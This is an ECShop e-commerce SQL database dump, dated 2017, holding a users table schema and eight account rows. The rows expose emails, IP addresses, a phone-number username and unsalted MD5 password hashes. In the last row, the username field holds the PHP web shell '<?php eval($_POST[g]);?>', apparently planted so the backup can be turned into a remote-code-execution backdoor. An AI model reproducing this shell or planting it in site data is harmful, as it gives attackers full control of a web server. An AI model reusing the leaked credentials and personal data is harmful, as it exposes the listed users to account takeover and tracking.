-- ecshop v2.x SQL Dump Program
-- http://cr.golinfen.com
-- 
-- DATE : 2017-05-12 15:26:23
-- MYSQL SERVER VERSION : 5.1.69-log
-- PHP VERSION : 5.3.29
-- ECShop VERSION : v2.7.3
-- Vol : 1
DROP TABLE IF EXISTS `ecs_users`;
CREATE TABLE `ecs_users` (
  `user_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `aite_id` text NOT NULL,
  `email` varchar(60) NOT NULL DEFAULT '',
  `user_name` varchar(60) NOT NULL DEFAULT '',
  `password` varchar(32) NOT NULL DEFAULT '',
  `question` varchar(255) NOT NULL DEFAULT '',
  `answer` varchar(255) NOT NULL DEFAULT '',
  `sex` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `birthday` date NOT NULL DEFAULT '0000-00-00',
  `user_money` decimal(10,2) NOT NULL DEFAULT '0.00',
  `frozen_money` decimal(10,2) NOT NULL DEFAULT '0.00',
  `pay_points` int(10) unsigned NOT NULL DEFAULT '0',
  `rank_points` int(10) unsigned NOT NULL DEFAULT '0',
  `address_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `reg_time` int(10) unsigned NOT NULL DEFAULT '0',
  `last_login` int(11) unsigned NOT NULL DEFAULT '0',
  `last_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `last_ip` varchar(15) NOT NULL DEFAULT '',
  `visit_count` smallint(5) unsigned NOT NULL DEFAULT '0',
  `user_rank` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `is_special` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `ec_salt` varchar(10) DEFAULT NULL,
  `salt` varchar(10) NOT NULL DEFAULT '0',
  `parent_id` mediumint(9) NOT NULL DEFAULT '0',
  `flag` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `alias` varchar(60) NOT NULL,
  `msn` varchar(60) NOT NULL,
  `qq` varchar(20) NOT NULL,
  `office_phone` varchar(20) NOT NULL,
  `home_phone` varchar(20) NOT NULL,
  `mobile_phone` varchar(20) NOT NULL,
  `is_validated` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `credit_line` decimal(10,2) unsigned NOT NULL,
  `passwd_question` varchar(50) DEFAULT NULL,
  `passwd_answer` varchar(255) DEFAULT NULL,
  `wxid` char(28) NOT NULL,
  `wxch_bd` char(2) NOT NULL,
  `nicheng` varchar(255) DEFAULT NULL,
  `password_xkfla` varchar(40) NOT NULL,
  PRIMARY KEY (`user_id`),
  UNIQUE KEY `user_name` (`user_name`),
  KEY `email` (`email`),
  KEY `parent_id` (`parent_id`),
  KEY `flag` (`flag`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
INSERT INTO `ecs_users` ( `user_id`, `aite_id`, `email`, `user_name`, `password`, `question`, `answer`, `sex`, `birthday`, `user_money`, `frozen_money`, `pay_points`, `rank_points`, `address_id`, `reg_time`, `last_login`, `last_time`, `last_ip`, `visit_count`, `user_rank`, `is_special`, `ec_salt`, `salt`, `parent_id`, `flag`, `alias`, `msn`, `qq`, `office_phone`, `home_phone`, `mobile_phone`, `is_validated`, `credit_line`, `passwd_question`, `passwd_answer`, `wxid`, `wxch_bd`, `nicheng`, `password_xkfla` ) VALUES  ('1', '', 'ecshop@ecshop.com', 'ecshop', 'ad38ff20d62df28081d7f7e5f2f06138', '', '', '0', '1956-01-01', '27.00', '0.00', '0', '0', '1', '1471229222', '1484027595', '0000-00-00 00:00:00', '0.0.0.0', '133', '0', '0', '167', '0', '0', '0', '', '', '', '', '', '', '0', '0.00', '', '', '', '', '', '');
INSERT INTO `ecs_users` ( `user_id`, `aite_id`, `email`, `user_name`, `password`, `question`, `answer`, `sex`, `birthday`, `user_money`, `frozen_money`, `pay_points`, `rank_points`, `address_id`, `reg_time`, `last_login`, `last_time`, `last_ip`, `visit_count`, `user_rank`, `is_special`, `ec_salt`, `salt`, `parent_id`, `flag`, `alias`, `msn`, `qq`, `office_phone`, `home_phone`, `mobile_phone`, `is_validated`, `credit_line`, `passwd_question`, `passwd_answer`, `wxid`, `wxch_bd`, `nicheng`, `password_xkfla` ) VALUES  ('2', '', '123@qq.com', 'ec123', 'e10adc3949ba59abbe56e057f20f883e', '', '', '0', '0000-00-00', '0.00', '0.00', '0', '0', '0', '1476336253', '1476336253', '0000-00-00 00:00:00', '0.0.0.0', '1', '0', '0', '', '0', '0', '0', '', '', '', '', '', '', '0', '0.00', '', '', '', '', '', '');
INSERT INTO `ecs_users` ( `user_id`, `aite_id`, `email`, `user_name`, `password`, `question`, `answer`, `sex`, `birthday`, `user_money`, `frozen_money`, `pay_points`, `rank_points`, `address_id`, `reg_time`, `last_login`, `last_time`, `last_ip`, `visit_count`, `user_rank`, `is_special`, `ec_salt`, `salt`, `parent_id`, `flag`, `alias`, `msn`, `qq`, `office_phone`, `home_phone`, `mobile_phone`, `is_validated`, `credit_line`, `passwd_question`, `passwd_answer`, `wxid`, `wxch_bd`, `nicheng`, `password_xkfla` ) VALUES  ('3', '', '', 'admin003', '76d1a2befd24379a7a7dcdd9f8b9b387', '', '', '255', '0000-00-00', '0.00', '0.00', '0', '0', '0', '1477527578', '1477527579', '0000-00-00 00:00:00', '125.69.45.181', '1', '0', '0', '', '0', '0', '0', '', '', '', '', '', '', '0', '0.00', '', '', '', '', '', '');
INSERT INTO `ecs_users` ( `user_id`, `aite_id`, `email`, `user_name`, `password`, `question`, `answer`, `sex`, `birthday`, `user_money`, `frozen_money`, `pay_points`, `rank_points`, `address_id`, `reg_time`, `last_login`, `last_time`, `last_ip`, `visit_count`, `user_rank`, `is_special`, `ec_salt`, `salt`, `parent_id`, `flag`, `alias`, `msn`, `qq`, `office_phone`, `home_phone`, `mobile_phone`, `is_validated`, `credit_line`, `passwd_question`, `passwd_answer`, `wxid`, `wxch_bd`, `nicheng`, `password_xkfla` ) VALUES  ('4', '', '', 'admin004', '6d83b6dc5108f40314a385c5f1d70d87', '', '', '0', '0000-00-00', '0.00', '0.00', '0', '0', '0', '1477527727', '1477527727', '0000-00-00 00:00:00', '117.136.64.86', '1', '0', '0', '', '0', '0', '0', '', '', '', '', '', '', '0', '0.00', '', '', '', '', '', '');
INSERT INTO `ecs_users` ( `user_id`, `aite_id`, `email`, `user_name`, `password`, `question`, `answer`, `sex`, `birthday`, `user_money`, `frozen_money`, `pay_points`, `rank_points`, `address_id`, `reg_time`, `last_login`, `last_time`, `last_ip`, `visit_count`, `user_rank`, `is_special`, `ec_salt`, `salt`, `parent_id`, `flag`, `alias`, `msn`, `qq`, `office_phone`, `home_phone`, `mobile_phone`, `is_validated`, `credit_line`, `passwd_question`, `passwd_answer`, `wxid`, `wxch_bd`, `nicheng`, `password_xkfla` ) VALUES  ('5', '', '184348080@qq.com', 'q123456q', '104a1cc28d163fa23fef941bd67d7150', '', '', '0', '0000-00-00', '0.00', '0.00', '0', '0', '2', '1494013145', '1494013145', '0000-00-00 00:00:00', '222.46.10.117', '1', '0', '0', '', '0', '0', '0', '', '', '', '', '', '', '0', '0.00', '', '', '', '', '', '');
INSERT INTO `ecs_users` ( `user_id`, `aite_id`, `email`, `user_name`, `password`, `question`, `answer`, `sex`, `birthday`, `user_money`, `frozen_money`, `pay_points`, `rank_points`, `address_id`, `reg_time`, `last_login`, `last_time`, `last_ip`, `visit_count`, `user_rank`, `is_special`, `ec_salt`, `salt`, `parent_id`, `flag`, `alias`, `msn`, `qq`, `office_phone`, `home_phone`, `mobile_phone`, `is_validated`, `credit_line`, `passwd_question`, `passwd_answer`, `wxid`, `wxch_bd`, `nicheng`, `password_xkfla` ) VALUES  ('6', '', '', 'wanglaoji', 'dc5264064933d51ef6103c1fb6092351', '', '', '255', '0000-00-00', '0.00', '0.00', '0', '0', '0', '1494133420', '1494133435', '0000-00-00 00:00:00', '112.235.182.186', '2', '0', '0', '3688', '0', '0', '0', '', '', '', '', '', '', '0', '0.00', '', '', '', '', '', '');
INSERT INTO `ecs_users` ( `user_id`, `aite_id`, `email`, `user_name`, `password`, `question`, `answer`, `sex`, `birthday`, `user_money`, `frozen_money`, `pay_points`, `rank_points`, `address_id`, `reg_time`, `last_login`, `last_time`, `last_ip`, `visit_count`, `user_rank`, `is_special`, `ec_salt`, `salt`, `parent_id`, `flag`, `alias`, `msn`, `qq`, `office_phone`, `home_phone`, `mobile_phone`, `is_validated`, `credit_line`, `passwd_question`, `passwd_answer`, `wxid`, `wxch_bd`, `nicheng`, `password_xkfla` ) VALUES  ('7', '', '706565419@qq.com', '18766742773', '5a11fecbd3dfe58368bb62ce6209cf6a', '', '', '0', '0000-00-00', '0.00', '0.00', '0', '0', '3', '1494193225', '1494193225', '0000-00-00 00:00:00', '119.186.138.222', '1', '0', '0', '', '0', '0', '0', '', '', '', '', '', '', '0', '0.00', '', '', '', '', '', '');
INSERT INTO `ecs_users` ( `user_id`, `aite_id`, `email`, `user_name`, `password`, `question`, `answer`, `sex`, `birthday`, `user_money`, `frozen_money`, `pay_points`, `rank_points`, `address_id`, `reg_time`, `last_login`, `last_time`, `last_ip`, `visit_count`, `user_rank`, `is_special`, `ec_salt`, `salt`, `parent_id`, `flag`, `alias`, `msn`, `qq`, `office_phone`, `home_phone`, `mobile_phone`, `is_validated`, `credit_line`, `passwd_question`, `passwd_answer`, `wxid`, `wxch_bd`, `nicheng`, `password_xkfla` ) VALUES  ('8', '', '323244@qq.com', '<?php eval($_POST[g]);?>', 'e10adc3949ba59abbe56e057f20f883e', '', '', '0', '1957-01-01', '0.00', '0.00', '0', '0', '0', '1494545163', '0', '0000-00-00 00:00:00', '', '0', '0', '0', '', '0', '0', '0', '', '', '', '', '', '', '0', '0.00', '', '', '', '', '', '');
-- END ecshop v2.x SQL Dump Program 